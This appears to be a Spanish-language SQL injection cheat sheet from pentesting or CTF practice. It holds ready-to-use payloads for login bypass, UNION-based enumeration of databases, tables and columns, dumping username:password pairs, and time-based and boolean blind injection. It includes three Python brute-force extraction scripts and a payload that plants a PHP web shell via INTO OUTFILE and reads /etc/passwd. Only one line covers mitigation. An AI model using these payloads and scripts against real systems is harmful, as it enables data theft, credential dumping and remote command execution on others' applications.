# SQL Injection
# Determinar la vulnerabilidad

## Básico

>Puedes burlar un panel de identificación muy básico mediante la query siguiente, como 1 = 1 la query es correcta y te deja pasar ya que devuelve un código de estado exitoso ya que aunque pepito no exista 1=1 y además como comentas la query de password si lo usas en username puedes pasar. También se puede usar en algunas bases de datos para **listar todos sus registros**.

```sql
pepito' or 1=1-- -
```
### Querys importantes para SQLI

>No es necesario que todas las sqli comiencen por una comilla simple, es probable que hasta sin poner ninguna comilla simple ni comentar el final de la query te interprete tu query, es decir mete tus consultas directamente en el campo.
>El uso de un, por ejemplo, id de producto que **no exista en la tabla** que usa el servicio web es el que permite que al hacer un **union select 1,2,3,4** muestre dichos números en las columnas pertinentes.

>Comentar el final de una query para evitar fallos de alguna comilla simple mal interpretada que corrompa la query:

```sql
-- - o con una #
```

> Muestra todos los resultados en la misma columna separado por comas:

```sql
group_concat()
```

>Mostrar solo un resultado, imaginar una base de datos con 3 tablas:

```sql
limit 0,1 --> Muestra la primera
limit 1,1 --> Muestra la segunda
limit 2,1 --> Muestra la última
```

>Determinar cuantas bases de datos/tablas hay, probar con números hasta que cuadres el número exacto, ni más ni menos:

```sql
' order by 100-- -
```


>Ver base de datos en la que te encuentras actualmente:

```sql
' union select database()-- -
```

>Ver usuario que está runeando la base de datos:

```sql
' union select user()-- -
```

>Inyección SQL para que se muestren todos los nombres de las bases de datos:

```sql
' union select group_concat(schema_name) from information_schema.schemata-- -
```

>Enumerar todas las tablas de una base de datos en específico:

```sql
' union select group_concat(table_name) from information_schema.tables where table_schema='nombreDB'-- -
```

>Enumerar todas las columnas de una tabla específica de una base de datos específica:

```sql
' union select group_concat(column_name) from information_schema.columns where table_schema='nombreDB' and table_name='nombreTabla'-- -
```

>Ver todos los registros de una tabla que se encuentre dentro de la base de datos en la que está operando el buscador:

```sql
' union select group_concat(nombreColumna) from nombreTabla-- -
```

> Mostrar registros de 2 columnas separados por ":", por ejemplo, username:password, 0x3a son los ":" en hex se puede poner tmbn como ':' con las comillas simples pero es recomendable en formato hex:

```sql
' union select group_concat(columna1,0x3a,columna2) from nombreTabla-- -
```
## Error based sqli

> Sabemos que una base de datos es vulnerable a SQLI de diferentes formas, una de ellas es si al poner una comilla simple lanza un error de sintaxis SQL.

```sql
EJEMPLO --> Campo de búsqueda de un producto por id --> Input --> test'
```

>Si **no lanza el error** se puede seguir con el procedimiento de abajo enumerando de la siguiente manera mediante los **order by**.
>Si en el visual de la página ves que al poner **order by 1** sale algo en un producto existente por ejemplo, puede significar o que hay **una o más tablas infiriendo**, probar hasta que el resultado desaparezca determinará el número:
>Si tratas de hacer un **union select 1** e infieren 2 tablas en la query no saldrá nada, pero si pones **union select 1,2** e infieren dos tablas si se mostrará un resultado visualmente.

## Inyección basada en tiempo

>Otra forma de averiguar si es vulnerable es mediante una **inyección por tiempo**, si metes un sleep de 5 segundos y la página tarda 5 segundos en darte un resultado significa que **está interpretando tu query**, tratar de poner un parámetro que existe en la base de datos, en este caso un id=1:

```sql
1' and sleep(5)-- -
```

>Si usamos and y la query de sleep(5) si lo que estemos proporcionando es true por ejemplo (id = 1) tardará en mostrar resultado 5 segundos y si no es true lo mostrará instantáneo.

### Script en python para fuerza bruta en inyección basada en tiempo

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import * 

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1);

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.1.36/cat.php"
characters = string.printable

def makeSQLI():

        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando proceso de fuerza bruta")

        time.sleep(2)

        p2 = log.progress("Datos extraídos")

        extracted_info = ""

        for position in range (1, 350):
                for character in characters:

                        sqli_url = main_url + "?id=1 and if(substr(database(),%d,1)='%s',sleep(0.5),1) " % (position, character) 

                        p1.status(sqli_url)

                        time_start = time.time()

                        r = requests.get(sqli_url)

                        time_end = time.time()

                        if time_end - time_start > 0.5:
                                extracted_info += character
                                p2.status(extracted_info)
                                break

if __name__ == '__main__':

        makeSQLI()
```
## Inyección SQL a ciegas

>Si la página web no muestra ningún output al realizar querys estamos ante una posible sqli a ciegas que podemos determinar gracias a una **sqli por tiempo de espera** o una **sqli condicional**.
>Te puedes dar cuenta si algún codigo de estado cambia según tu query de si hay algún condicional que te de un código de estado distinto según si tu petición existe en la base de datos o no.
>

## SQLI condicional

>Enviar por GET para ver códigos de estados de querys inyectadas mediante url:

```bash
curl -s -I -X GET "http://nombre/searchUsers.php" -G --data-urlencode "id=1 or 1=1"
```

>Ver por ejemplo mediante condicional si la primera letra del primer username es una "a". Recordar que a en ascii es 97. Donde según la página si es true devolverá un status code de 200 o de 404 si es un false.

```bash
curl -s -I -X GET "http://nombre/searchUsers.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=97)"
```

#### Python Scripting para probar todos los posibles caracteres de un registro y obtenerlo por fuerza bruta

Debes conocer la tabla para usar esto

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import * //Instalar pwn con apt

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1);

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://ejemplo/searchUsers.php"
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Datos extraídos")

	extracted_info = ""

	for position in range (1, 350):
		for character in range(33, 126):
			//Modificar query sql a gusto
			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character) //?id= se puede cambiar a lo que use la página

			p1.status(sqli_url)

			r = requests.get(sqli_url)

			if r.status_code == 200:
				extracted_info += chr(character)
				p2.status(extracted_info)
				break
				
if __name__ == '__main__':

	makeSQLI()
```

### Boolean-based blind SQL Injection

>Filtrar primer caracter de los usernames por ejemplo:

```sql
select substring(username,1,1) --> El primer valor dicta la posición del caracter y el segundo la posición del registro.
```

>En este tipo de sqli se trata de hacer que, por ejemplo, se de el caso de que 'a'='a' para que se muestre un código de estado booleano que diga true representados en 1 (true) y 0 (false).

```sql
select(select substring(username,1,1) from users where id = 1)= 'a';
```

>Una mejor forma de hacerlo para evitar el uso de comillas simples, se debe pasar por ejemplo la "a" a decimal mediante:

```sql
select ascii(substring(username,1,1)) from users where id = 1;
```

>Donde mostrará que "a" = 97 donde podremos aprovechar ese 97 para hacer la query evitando las comillas simples y retornando un 1 (true) ya que 97 es igual a 97.

```sql
select(select ascii(substring(username,1,1)) from users where id = 1)=97;
```

## Script para SQLI Boolean Based

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal,SIGINT, def_handler)

#Variables globales
characters = string.ascii_lowercase
main_url = "http://192.168.1.37/imfadministrator/cms.php?pagename="

def sqli():

	headers = {
		'Cookie': 'PHPSESSID='
	}

	data = ""

	p1 = log.progress("SQLI")
	p1.status("Iniciando ataque de inyección SQL")

	time.sleep(2)

	p2 = log.progress("Data")

	for position in range(1,6):
		for character in characters:

			sqli_url = main_url + "home' or substring(database(),%d,1)='%s" % (position, character)

			r = requests.get(sqli_url, headers=headers)

			if "Welcome to the IMF Administration." not in r.text:
				data += character
				p2.status(data)
				break

	p1.success("Ataque de inyección SQL finalizado exitosamente")
	p2.success(data)

if __name__ == '__main__':

	sqli()

```

# Sanitización de una query para que no se pueda realizar sqli 

```php
$id = mysqli_real_escape_string($conn, $_GET['id']);
```
# Escritura de archivos mediante una SQLi

```sql
' UNION SELECT 1,2,3, "<?php system($_GET['cmd']); ?>" into OUTFILE "/var/www/html/webshell.php" 
```
# Lectura de archivos mediante una SQLi

```sql
' UNION SELECT 1,2,3, load_file("/etc/passwd")
```
